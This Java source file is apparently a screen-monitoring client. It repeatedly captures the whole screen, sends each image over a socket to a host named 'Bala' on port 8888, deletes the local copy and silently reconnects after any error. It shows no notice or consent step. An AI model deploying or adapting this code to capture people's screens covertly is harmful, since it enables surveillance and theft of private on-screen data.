import java.awt.AWTException;
import java.io.*;
import java.net.Socket;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.net.InetAddress;
import javax.imageio.ImageIO;
public class Dataclient {
    InetAddress ia;
    Socket s;
    public void connect() 
    {
        try {   
monitor();
        } catch (Exception ex) {
            connect();
            }
	 }
public void monitor()
{
        try {
            Robot robot = new Robot();
         
            while(true)
            {
            
                ia=InetAddress.getByName("Bala");      
s = new Socket(ia.getHostAddress(),8888);
                
                        BufferedImage screenShot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                        File f=new File("screenShot.jpg");
                        if(f.exists())
                        {
                            f.delete();
                        }
                         ImageIO.write(screenShot, "JPG", new File("screenShot.jpg"));
                    Thread.sleep(100);      
        FileInputStream fis = new FileInputStream("screenShot.jpg");
        byte[] buffer = new byte[fis.available()];
        fis.read(buffer);
        ObjectOutputStream oos = new ObjectOutputStream(s.getOutputStream()) ;
        oos.writeObject(buffer); 
        oos.flush();
        File f1=new File("screenShot.jpg");
        f1.delete();

        Thread.sleep(50);
            s.close();
            }
        } catch (InterruptedException ex) {         
            connect();    
        } catch (IOException ex) {
           connect();    
        } 
        catch (AWTException ex) {
           connect();    
        }
 }
    public static void main(String[] args)
    {
    Dataclient t=new Dataclient();
    t.connect();
   }
}
